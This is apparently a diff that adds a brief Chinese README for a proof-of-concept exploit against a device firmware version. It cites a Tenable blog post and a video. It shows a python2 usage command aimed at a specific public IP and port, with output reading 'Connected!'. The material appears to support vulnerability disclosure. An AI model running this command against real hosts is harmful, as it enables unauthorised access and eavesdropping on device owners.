@@ -1,0 +1,9 @@
+验证方式：验证文章+验证视频
+文章链接：https://medium.com/tenable-techblog/i-always-feel-like-somebodys-w%CC%B6a%CC%B6t%CC%B6c%CC%B6h%CC%B6i%CC%B6n%CC%B6g%CC%B6-listening-to-me-938cc14aa13c
+验证视频：https://youtu.be/kZTza1BiahQ
+目标产品：V2.520.AC00.18.R
+
+poc用法：
+PS D:\Desktop> python2 .\1.py -i 182.106.203.181 -p 8001 -o lol.raw -b 209714
+[+] Attempting connection to 182.106.203.181:8001
+[+] Connected!
